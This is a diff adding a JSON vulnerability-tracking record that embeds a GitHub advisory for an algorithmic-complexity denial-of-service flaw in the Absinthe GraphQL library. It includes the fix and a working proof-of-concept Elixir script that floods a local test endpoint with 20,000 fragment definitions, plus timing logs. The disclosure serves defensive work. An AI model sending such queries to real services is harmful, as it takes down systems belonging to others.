@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/10426523?v=4\", \"events_url\": \"https://api.github.com/users/PJUllrich/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/PJUllrich/followers\", \"following_url\": \"https://api.github.com/users/PJUllrich/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/PJUllrich/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/PJUllrich\", \"id\": 10426523, \"login\": \"PJUllrich\", \"node_id\": \"MDQ6VXNlcjEwNDI2NTIz\", \"organizations_url\": \"https://api.github.com/users/PJUllrich/orgs\", \"received_events_url\": \"https://api.github.com/users/PJUllrich/received_events\", \"repos_url\": \"https://api.github.com/users/PJUllrich/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/PJUllrich/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/PJUllrich/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/PJUllrich\", \"user_view_type\": \"public\"}}, {\"type\": \"remediation_developer\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/76575?v=4\", \"events_url\": \"https://api.github.com/users/cschiewek/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/cschiewek/followers\", \"following_url\": \"https://api.github.com/users/cschiewek/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/cschiewek/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/cschiewek\", \"id\": 76575, \"login\": \"cschiewek\", \"node_id\": \"MDQ6VXNlcjc2NTc1\", \"organizations_url\": \"https://api.github.com/users/cschiewek/orgs\", \"received_events_url\": \"https://api.github.com/users/cschiewek/received_events\", \"repos_url\": \"https://api.github.com/users/cschiewek/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/cschiewek/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/cschiewek/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/cschiewek\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-43967\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 8.7, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-407\", \"name\": \"Inefficient Algorithmic Complexity\"}], \"description\": \"### Summary\\nAn unauthenticated attacker can stall an Absinthe-backed GraphQL endpoint by submitting a query that contains many fragment definitions. The fragment-name uniqueness validation phase is O(N²) in the number of fragments, so a single modestly-sized request burns seconds of CPU per worker, and sustained traffic exhausts the worker pool (denial of service).\\n\\nIntroduced like with https://github.com/absinthe-graphql/absinthe/commit/0b46e3bcc06c0d3797bacd64761b908a84646c1d#diff-e540120c6a98cc1013be110d08e9d029511b9aabd26ad5f7f643c36834caac14\\n\\n### Details\\n`Absinthe.Phase.Document.Validation.UniqueFragmentNames` (`lib/absinthe/phase/document/validation/unique_fragment_names.ex:14-40`) walks every fragment in `input.fragments` via `run/2`, calling `process/2` on each one. `process/2` then calls `duplicate?/2`, which evaluates `Enum.count(fragments, fn f -> f.name == name end)` — a full linear scan of the fragment list — for every individual fragment. The result is `N · N` name comparisons per document.\\n\\n`input.fragments` is built directly from the GraphQL query text the caller sends at the head of the pipeline, so `N` is attacker-controlled. A minimum-size fragment definition (`fragment a on T{f}`) is roughly 16 bytes, so a ~1 MB document carries ~60 000 fragments and forces ~3.6 × 10⁹ comparisons inside this one phase. Phoenix's default 8 MB body limit allows substantially larger blow-ups if operators have not lowered it. Nothing in this module caps `N`.\\n\\nThe fix is to aggregate names once per call rather than re-scanning per fragment, e.g.:\\n\\n```elixir\\ndups =\\n  for {name, k} <- Enum.frequencies_by(input.fragments, & &1.name),\\n      k > 1,\\n      into: MapSet.new(),\\n      do: name\\n```\\n\\nand then check `MapSet.member?(dups, fragment.name)` inside `process/2`. That collapses the phase to O(N).\\n\\n### PoC\\nA standalone script that builds a GraphQL document with a large number of minimal fragment definitions, feeds it through Absinthe's pipeline, and times the `UniqueFragmentNames` phase is attached at the end of this report. Running it shows the validation time growing quadratically with the fragment count.\\n\\n### Impact\\nAlgorithmic complexity / denial-of-service. Any service that exposes an Absinthe GraphQL endpoint to untrusted callers is affected: a single unauthenticated POST containing many fragment definitions pins a worker process for seconds, and modest sustained traffic exhausts the request-handling pool. No authentication, schema knowledge, or special configuration is required — only the ability to send a GraphQL query large enough to contain many fragments, which is permitted by Phoenix's default body-size limit.\\n\\n## Scripts and Logs\\n\\n```elixir\\n# Verifies: Quadratic fragment-name uniqueness check\\n\\nMix.install([\\n  {:absinthe, \\\"~> 1.7\\\"},\\n  {:absinthe_plug, \\\"~> 1.5\\\"},\\n  {:bandit, \\\"~> 1.0\\\"},\\n  {:plug, \\\"~> 1.15\\\"},\\n  {:jason, \\\"~> 1.4\\\"},\\n  {:req, \\\"~> 0.5\\\"}\\n])\\n\\ndefmodule VictimSchema do\\n  use Absinthe.Schema\\n\\n  object :thing do\\n    field :f, :string\\n  end\\n\\n  query do\\n    field :thing, :thing do\\n      resolve(fn _, _ -> {:ok, %{f: \\\"x\\\"}} end)\\n    end\\n  end\\nend\\n\\ndefmodule VictimRouter do\\n  use Plug.Router\\n\\n  plug :match\\n\\n  plug Plug.Parsers,\\n    parsers: [:json],\\n    pass: [\\\"*/*\\\"],\\n    json_decoder: Jason\\n\\n  plug :dispatch\\n\\n  forward \\\"/graphql\\\",\\n    to: Absinthe.Plug,\\n    init_opts: [schema: VictimSchema]\\n\\n  match _ do\\n    send_resp(conn, 404, \\\"nope\\\")\\n  end\\nend\\n\\nport = 47817\\n{:ok, _} = Bandit.start_link(plug: VictimRouter, port: port)\\n\\nn = 20_000\\n\\nfragments =\\n  1..n\\n  |> Enum.map(fn i -> \\\"fragment f#{i} on Thing{f}\\\" end)\\n  |> Enum.join(\\\" \\\")\\n\\nquery = \\\"{ thing { f } } \\\" <> fragments\\n\\nIO.puts(\\n  \\\"Sending GraphQL document with #{n} fragment definitions (~#{div(byte_size(query), 1024)} KB) to 127.0.0.1:#{port}\\\"\\n)\\n\\n{us, response} =\\n  :timer.tc(fn ->\\n    Req.post!(\\\"http://127.0.0.1:#{port}/graphql\\\",\\n      json: %{query: query},\\n      receive_timeout: 600_000,\\n      retry: false\\n    )\\n  end)\\n\\nms = div(us, 1000)\\nIO.puts(\\\"HTTP response status: #{response.status}\\\")\\nIO.puts(\\\"Total request elapsed (validation-dominated): #{ms} ms\\\")\\n\\nresult =\\n  if ms > 1000 do\\n    \\\"VERIFIED: ~#{n} fragments in one unauthenticated request forced #{ms} ms of CPU in Absinthe's UniqueFragmentNames phase (quadratic check).\\\"\\n  else\\n    \\\"NOT VERIFIED: elapsed #{ms} ms below DoS threshold\\\"\\n  end\\n\\nIO.puts(result)\\n```\\n\\n\\n### Logs\\n\\n```logs\\nHTTP response status: 200\\nTotal request elapsed (validation-dominated): 15451 ms\\nVERIFIED: ~20000 fragments in one unauthenticated request forced 15451 ms of CPU in Absinthe's UniqueFragmentNames phase (quadratic check).\\n```\", \"epss\": {\"percentage\": 0.00624, \"percentile\": 0.45518}, \"ghsa_id\": \"GHSA-9mhv-8h52-q7q2\", \"github_reviewed_at\": \"2026-05-14T13:08:44Z\", \"html_url\": \"https://github.com/advisories/GHSA-9mhv-8h52-q7q2\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-9mhv-8h52-q7q2\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-43967\"}], \"nvd_published_at\": \"2026-05-08T16:16:12Z\", \"published_at\": \"2026-05-14T13:08:44Z\", \"references\": [\"https://github.com/absinthe-graphql/absinthe/security/advisories/GHSA-9mhv-8h52-q7q2\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-43967\", \"https://github.com/absinthe-graphql/absinthe/commit/223600c520493dcaf95080af552c413099f92c9d\", \"https://cna.erlef.org/cves/CVE-2026-43967.html\", \"https://osv.dev/vulnerability/EEF-CVE-2026-43967\", \"https://github.com/advisories/GHSA-9mhv-8h52-q7q2\"], \"repository_advisory_url\": \"https://api.github.com/repos/absinthe-graphql/absinthe/security-advisories/GHSA-9mhv-8h52-q7q2\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/absinthe-graphql/absinthe\", \"summary\": \"Absinthe: Quadratic fragment-name uniqueness check\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-14T13:08:45Z\", \"url\": \"https://api.github.com/advisories/GHSA-9mhv-8h52-q7q2\", \"vulnerabilities\": [{\"first_patched_version\": \"1.10.2\", \"package\": {\"ecosystem\": \"erlang\", \"name\": \"absinthe\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 1.2.0, < 1.10.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-9mhv-8h52-q7q2",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "absinthe: >= 1.2.0, < 1.10.2"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-43967"
+    ],
+    "cvss_score": 8.7,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "absinthe"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.443034Z",
+  "provenance": {
+    "content_sha256": "3683da5bc17b6db7226d751c83aae04d38d9e1b93191c20e62afc359bf3884b4",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-14T13:08:44Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-9mhv-8h52-q7q2",
+  "status": "active",
+  "title": "Absinthe: Quadratic fragment-name uniqueness check",
+  "updated_at": "2026-05-14T13:08:45Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-9mhv-8h52-q7q2"
+}
